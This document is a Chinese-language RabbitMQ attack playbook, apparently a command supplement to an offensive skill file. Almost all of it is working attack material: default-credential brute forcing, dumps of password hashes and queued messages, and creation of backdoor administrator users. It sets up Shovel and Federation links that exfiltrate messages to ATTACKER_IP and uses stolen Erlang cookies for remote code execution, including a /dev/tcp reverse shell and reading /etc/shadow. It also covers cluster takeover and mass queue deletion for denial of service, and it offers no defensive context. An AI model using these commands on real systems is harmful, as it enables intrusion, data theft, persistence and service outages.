# RabbitMQ 攻击技术参考

> 本文档是 SKILL.md 各 Phase 的详细命令与技术补充。

---

## 1. 默认凭据与弱口令

### 利用条件
- RabbitMQ Management Plugin 已启用（15672 端口）
- 默认 guest/guest 凭据未修改，或配置了 `loopback_users = none` 允许远程 guest 登录
- 无 IP 白名单或网络层限制

### 默认凭据测试

```bash
# guest/guest（最高优先级）
curl -s -u guest:guest http://TARGET:15672/api/overview

# 其他常见凭据
curl -s -u admin:admin http://TARGET:15672/api/overview
curl -s -u admin:password http://TARGET:15672/api/overview
curl -s -u admin:123456 http://TARGET:15672/api/overview
curl -s -u rabbitmq:rabbitmq http://TARGET:15672/api/overview
curl -s -u test:test http://TARGET:15672/api/overview
```

### 批量凭据检测脚本

```bash
#!/bin/bash
TARGET=$1
PORT=${2:-15672}
CREDS_LIST=("guest:guest" "admin:admin" "admin:password" "admin:123456"
            "rabbitmq:rabbitmq" "test:test" "monitor:monitor" "user:user")

for creds in "${CREDS_LIST[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -u "$creds" "http://$TARGET:$PORT/api/overview")
  if [ "$code" = "200" ]; then
    echo "[+] VALID: $creds"
    # 获取版本信息
    curl -s -u "$creds" "http://$TARGET:$PORT/api/overview" | jq '{rabbitmq_version, cluster_name}'
  fi
done
```

### 爆破工具

```bash
# Hydra 针对 Management API
hydra -L users.txt -P passwords.txt TARGET http-get /api/overview -s 15672

# Nmap HTTP Basic Auth 爆破
nmap -p 15672 --script http-brute --script-args http-brute.path=/api/overview TARGET

# Metasploit
msf> use auxiliary/scanner/http/rabbitmq_login
msf> set RHOSTS TARGET
msf> set RPORT 15672
msf> run
```

**攻击效果**: 获得 Management API 完全控制权，可进行后续所有攻击操作。

---

## 2. Management API 枚举

### 利用条件
- 已获得有效凭据
- 用户具备 management 或 administrator tag

### 完整枚举命令

```bash
# 系统概览
curl -s -u USER:PASS http://TARGET:15672/api/overview | jq '.'

# 集群名称与版本
curl -s -u USER:PASS http://TARGET:15672/api/overview | jq '{rabbitmq_version, erlang_version, cluster_name}'

# 所有用户
curl -s -u USER:PASS http://TARGET:15672/api/users | jq '.[] | {name, tags, password_hash}'

# 所有 VHost
curl -s -u USER:PASS http://TARGET:15672/api/vhosts | jq '.[].name'

# 所有权限
curl -s -u USER:PASS http://TARGET:15672/api/permissions | jq '.'

# 所有队列（含消息数量）
curl -s -u USER:PASS http://TARGET:15672/api/queues | jq '.[] | {vhost, name, messages, consumers}'

# 所有 Exchange
curl -s -u USER:PASS http://TARGET:15672/api/exchanges | jq '.[] | {vhost, name, type}'

# 所有绑定关系
curl -s -u USER:PASS http://TARGET:15672/api/bindings | jq '.'

# 所有连接（获取客户端 IP 和用户名）
curl -s -u USER:PASS http://TARGET:15672/api/connections | jq '.[] | {peer_host, peer_port, user, client_properties}'

# 所有通道
curl -s -u USER:PASS http://TARGET:15672/api/channels | jq '.[] | {connection_details, user, prefetch_count}'

# 所有节点
curl -s -u USER:PASS http://TARGET:15672/api/nodes | jq '.[] | {name, type, running, mem_used, erlang_version}'

# 集群健康检查
curl -s -u USER:PASS http://TARGET:15672/api/healthchecks/node | jq '.'

# 已安装插件
curl -s -u USER:PASS http://TARGET:15672/api/extensions | jq '.'
```

### rabbitmqadmin 工具

```bash
# 下载 rabbitmqadmin（从目标 Management UI 获取）
wget http://TARGET:15672/cli/rabbitmqadmin
chmod +x rabbitmqadmin

# 列出队列
./rabbitmqadmin -H TARGET -u USER -p PASS list queues

# 列出 Exchange
./rabbitmqadmin -H TARGET -u USER -p PASS list exchanges

# 列出绑定
./rabbitmqadmin -H TARGET -u USER -p PASS list bindings

# 获取消息
./rabbitmqadmin -H TARGET -u USER -p PASS get queue=QUEUE_NAME count=100
```

**攻击效果**: 获取完整的消息架构拓扑、用户凭据哈希、客户端连接信息，为后续攻击提供情报。

---

## 3. 消息批量导出

### 利用条件
- 已获得有效凭据
- 目标队列中有待消费的消息（messages > 0）

### 单队列消息获取

```bash
# 获取消息（requeue: true 保留原消息不被消费）
curl -s -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
  -H "content-type: application/json" \
  -d '{"count": 100, "requeue": true, "encoding": "auto"}'

# 获取消息并格式化输出
curl -s -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
  -H "content-type: application/json" \
  -d '{"count": 100, "requeue": true, "encoding": "auto"}' | \
  jq '.[] | {routing_key, payload, properties}'
```

### 全量批量导出

```bash
#!/bin/bash
# 导出所有 VHost 下所有队列的消息
TARGET=$1
USER=$2
PASS=$3
OUTPUT="rabbitmq_dump_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT"

# 获取所有 VHost
vhosts=$(curl -s -u "$USER:$PASS" "http://$TARGET:15672/api/vhosts" | jq -r '.[].name')

for vhost in $vhosts; do
  encoded_vhost=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$vhost', safe=''))")

  # 获取该 VHost 下所有队列
  queues=$(curl -s -u "$USER:$PASS" "http://$TARGET:15672/api/queues/$encoded_vhost" | jq -r '.[] | select(.messages > 0) | .name')

  for queue in $queues; do
    encoded_queue=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$queue', safe=''))")
    echo "[*] Dumping: vhost=$vhost queue=$queue"

    curl -s -u "$USER:$PASS" \
      "http://$TARGET:15672/api/queues/$encoded_vhost/$encoded_queue/get" \
      -H "content-type: application/json" \
      -d '{"count": 50000, "requeue": true, "encoding": "auto"}' \
      > "$OUTPUT/${vhost}_${queue}.json"
  done
done

echo "[+] Messages dumped to $OUTPUT/"
```

### AMQP 协议直连消费

```bash
# 使用 amqp-consume（amqp-tools 包）
amqp-consume -s TARGET -p 5672 --username=USER --password=PASS \
  --queue=QUEUE_NAME cat

# Python pika 脚本消费
python3 -c "
import pika, json
creds = pika.PlainCredentials('USER', 'PASS')
conn = pika.BlockingConnection(pika.ConnectionParameters('TARGET', 5672, '/', creds))
ch = conn.channel()
for method, props, body in ch.consume('QUEUE_NAME', auto_ack=False, inactivity_timeout=5):
    if method: print(json.dumps({'routing_key': method.routing_key, 'body': body.decode()}))
    else: break
conn.close()
"
```

**攻击效果**: 获取消息队列中的敏感业务数据，可能包含凭据、API 密钥、PII 等。

---

## 4. 用户与权限操控

### 利用条件
- 已获得 administrator tag 的用户凭据
- Management API 可达

### 用户管理

```bash
# 创建后门 administrator 用户
curl -u USER:PASS -X PUT \
  http://TARGET:15672/api/users/svc-monitor \
  -H "content-type: application/json" \
  -d '{"password": "C0mpl3x!Pass", "tags": "administrator"}'

# 创建低权限隐蔽用户（management tag 仅能查看）
curl -u USER:PASS -X PUT \
  http://TARGET:15672/api/users/monitoring \
  -H "content-type: application/json" \
  -d '{"password": "M0n!tor", "tags": "management"}'

# 修改已有用户密码
curl -u USER:PASS -X PUT \
  http://TARGET:15672/api/users/TARGET_USER \
  -H "content-type: application/json" \
  -d '{"password": "newpassword", "tags": "administrator"}'

# 删除用户
curl -u USER:PASS -X DELETE http://TARGET:15672/api/users/TARGET_USER

# 列出所有用户及 tag
curl -s -u USER:PASS http://TARGET:15672/api/users | jq '.[] | {name, tags}'
```

### 权限管理

```bash
# 授予用户对指定 VHost 的全部权限
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/permissions/%2F/USERNAME" \
  -H "content-type: application/json" \
  -d '{"configure": ".*", "write": ".*", "read": ".*"}'

# 授予对所有 VHost 的权限
for vhost in $(curl -s -u USER:PASS http://TARGET:15672/api/vhosts | jq -r '.[].name'); do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$vhost', safe=''))")
  curl -u USER:PASS -X PUT \
    "http://TARGET:15672/api/permissions/$encoded/USERNAME" \
    -H "content-type: application/json" \
    -d '{"configure": ".*", "write": ".*", "read": ".*"}'
done

# 查看用户权限
curl -s -u USER:PASS http://TARGET:15672/api/users/USERNAME/permissions | jq '.'
```

### Topic 权限（RabbitMQ >= 3.7）

```bash
# 设置 topic exchange 权限
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/topic-permissions/%2F/USERNAME" \
  -H "content-type: application/json" \
  -d '{"exchange": "amq.topic", "write": ".*", "read": ".*"}'
```

**攻击效果**: 创建持久化后门访问、提升权限、或锁定合法用户。

---

## 5. VHost 操控

### 利用条件
- 已获得 administrator tag 的用户凭据

### VHost 管理

```bash
# 列出所有 VHost
curl -s -u USER:PASS http://TARGET:15672/api/vhosts | jq '.[] | {name, messages}'

# 创建 VHost
curl -u USER:PASS -X PUT \
  http://TARGET:15672/api/vhosts/attacker-vhost \
  -H "content-type: application/json" -d '{}'

# 删除 VHost（危险：删除该 VHost 下所有队列、Exchange、绑定、消息）
curl -u USER:PASS -X DELETE \
  http://TARGET:15672/api/vhosts/TARGET_VHOST

# 获取 VHost 详细信息
curl -s -u USER:PASS http://TARGET:15672/api/vhosts/TARGET_VHOST | jq '.'
```

**攻击效果**: 删除 VHost 可造成拒绝服务，创建 VHost 可用于隐蔽操作。

---

## 6. Shovel 与 Federation 数据外传

### 利用条件
- 已获得 administrator 凭据
- rabbitmq_shovel 或 rabbitmq_federation 插件已启用
- 攻击机运行 RabbitMQ 实例并监听

### Shovel 配置（实时消息转发）

```bash
# 检查 Shovel 插件是否启用
curl -s -u USER:PASS http://TARGET:15672/api/overview | jq '.listeners'

# 创建动态 Shovel
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/parameters/shovel/%2F/data-exfil" \
  -H "content-type: application/json" \
  -d '{
    "value": {
      "src-protocol": "amqp091",
      "src-uri": "amqp://localhost",
      "src-queue": "sensitive-queue",
      "dest-protocol": "amqp091",
      "dest-uri": "amqp://attacker:password@ATTACKER_IP",
      "dest-queue": "collected-data",
      "ack-mode": "on-confirm",
      "delete-after": "never"
    }
  }'

# 查看 Shovel 状态
curl -s -u USER:PASS http://TARGET:15672/api/shovels | jq '.'

# 删除 Shovel（清理）
curl -u USER:PASS -X DELETE \
  "http://TARGET:15672/api/parameters/shovel/%2F/data-exfil"
```

### Federation 配置（Exchange 镜像）

```bash
# 创建 Federation Upstream
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/parameters/federation-upstream/%2F/exfil-upstream" \
  -H "content-type: application/json" \
  -d '{
    "value": {
      "uri": "amqp://attacker:password@ATTACKER_IP",
      "prefetch-count": 1000,
      "reconnect-delay": 5,
      "ack-mode": "on-confirm"
    }
  }'

# 创建策略将 Exchange 关联到 Federation
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/policies/%2F/federation-policy" \
  -H "content-type: application/json" \
  -d '{
    "pattern": ".*",
    "definition": {"federation-upstream-set": "all"},
    "apply-to": "exchanges"
  }'

# 查看 Federation 状态
curl -s -u USER:PASS http://TARGET:15672/api/federation-links | jq '.'

# 清理
curl -u USER:PASS -X DELETE "http://TARGET:15672/api/policies/%2F/federation-policy"
curl -u USER:PASS -X DELETE "http://TARGET:15672/api/parameters/federation-upstream/%2F/exfil-upstream"
```

### 攻击机准备

```bash
# 在攻击机启动 RabbitMQ（Docker 快速部署）
docker run -d --name exfil-mq -p 5672:5672 -p 15672:15672 \
  -e RABBITMQ_DEFAULT_USER=attacker -e RABBITMQ_DEFAULT_PASS=password \
  rabbitmq:management

# 监控收到的消息
docker exec exfil-mq rabbitmqctl list_queues
```

**攻击效果**: 实时窃取消息流量，目标业务无感知（Shovel 使用 requeue 模式时）。

---

## 7. Erlang Cookie RCE

### 利用条件
- 可读取目标 Erlang Cookie 文件（通过文件读取漏洞、SSH 低权限访问等）
- 4369 端口（epmd）可达，或已知目标节点名
- 攻击机安装 Erlang/OTP

### Cookie 获取路径

```bash
# RabbitMQ 默认 Cookie 路径
/var/lib/rabbitmq/.erlang.cookie
/home/rabbitmq/.erlang.cookie
~/.erlang.cookie

# Docker 容器中
docker exec CONTAINER cat /var/lib/rabbitmq/.erlang.cookie

# Windows
C:\Users\RABBITMQ_USER\.erlang.cookie
C:\Windows\system32\config\systemprofile\.erlang.cookie

# 环境变量
env | grep -i cookie
cat /proc/$(pgrep -f rabbitmq)/environ | tr '\0' '\n' | grep COOKIE
```

### 节点名发现

```bash
# epmd 枚举（4369 端口）
epmd -port 4369 -names
# 输出示例: name rabbit at port 25672

# Nmap epmd 枚举
nmap -p 4369 --script epmd-info TARGET

# 从 Management API 获取
curl -s -u USER:PASS http://TARGET:15672/api/nodes | jq '.[].name'
# 输出示例: "rabbit@hostname"
```

### RCE 利用

```bash
# 方法 1: Erlang 远程 Shell
erl -sname attacker -setcookie STOLEN_COOKIE
# 在 Erlang shell 中连接到目标
> net_adm:ping('rabbit@TARGET_HOSTNAME').
# 返回 pong 表示连接成功

# 远程执行命令
> rpc:call('rabbit@TARGET_HOSTNAME', os, cmd, ["id"]).
> rpc:call('rabbit@TARGET_HOSTNAME', os, cmd, ["cat /etc/shadow"]).
> rpc:call('rabbit@TARGET_HOSTNAME', os, cmd, ["whoami"]).

# 反弹 Shell
> rpc:call('rabbit@TARGET_HOSTNAME', os, cmd, ["bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"]).

# 方法 2: rabbitmqctl 远程管理
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME cluster_status

# rabbitmqctl eval 执行 Erlang 表达式
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME eval 'os:cmd("id").'
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME eval 'os:cmd("cat /etc/passwd").'

# 方法 3: 一行式 RCE（无需交互式 shell）
erl -sname attacker -setcookie STOLEN_COOKIE -eval "rpc:call('rabbit@TARGET_HOSTNAME', os, cmd, [\"id\"]), init:stop()." -noshell
```

### 集群接管

```bash
# 将攻击机加入目标集群
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME cluster_status
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl join_cluster rabbit@TARGET_HOSTNAME

# 从集群中移除节点（DoS）
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME forget_cluster_node rabbit@VICTIM_NODE
```

**攻击效果**: 获得 RabbitMQ 进程用户权限的完全 RCE，可进一步横向移动到集群其他节点。

---

## 8. 消息篡改与拒绝服务

### 利用条件
- 已获得有效凭据，对目标队列有 write 权限

### 消息篡改

```bash
# 步骤 1: 消费原始消息（不重新入队）
curl -s -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
  -H "content-type: application/json" \
  -d '{"count": 1, "requeue": false, "encoding": "auto"}' > original_msg.json

# 步骤 2: 修改消息内容
cat original_msg.json | jq '.[0].payload = "tampered_data"' > tampered_msg.json

# 步骤 3: 重新发布篡改后的消息
ROUTING_KEY=$(jq -r '.[0].routing_key' original_msg.json)
PAYLOAD=$(jq -r '.[0].payload' tampered_msg.json)

curl -u USER:PASS \
  "http://TARGET:15672/api/exchanges/%2F/amq.default/publish" \
  -H "content-type: application/json" \
  -d "{\"routing_key\": \"$ROUTING_KEY\", \"payload\": \"$PAYLOAD\", \"payload_encoding\": \"string\", \"properties\": {}}"
```

### 队列清空与删除

```bash
# 清空队列中所有消息
curl -X DELETE -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/contents"

# 删除队列
curl -X DELETE -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME"

# 批量清空所有队列
for queue in $(curl -s -u USER:PASS http://TARGET:15672/api/queues | jq -r '.[].name'); do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$queue', safe=''))")
  curl -X DELETE -u USER:PASS "http://TARGET:15672/api/queues/%2F/$encoded/contents"
  echo "[*] Purged: $queue"
done
```

### Exchange 与绑定破坏

```bash
# 删除 Exchange（破坏消息路由）
curl -X DELETE -u USER:PASS \
  "http://TARGET:15672/api/exchanges/%2F/EXCHANGE_NAME"

# 删除绑定关系（消息无法到达队列）
curl -X DELETE -u USER:PASS \
  "http://TARGET:15672/api/bindings/%2F/e/EXCHANGE_NAME/q/QUEUE_NAME/ROUTING_KEY"
```

**攻击效果**: 篡改消息可干扰业务逻辑，删除队列/Exchange 可造成严重服务中断。

---

## 工具清单

| 工具 | 地址 | 用途 |
|------|------|------|
| curl + Management API | RabbitMQ 自带 | 所有 HTTP API 操作 |
| rabbitmqadmin | http://TARGET:15672/cli/ | RabbitMQ 官方 CLI |
| amqp-tools | apt install amqp-tools | AMQP 协议命令行工具 |
| pika | pip install pika | Python AMQP 客户端 |
| erl / rabbitmqctl | Erlang/OTP 自带 | Erlang Cookie 利用 |
| epmd | Erlang/OTP 自带 | 节点名枚举 |
| hydra | https://github.com/vanhauser-thc/thc-hydra | HTTP Basic Auth 爆破 |
| nmap | https://nmap.org | 端口扫描与脚本枚举 |
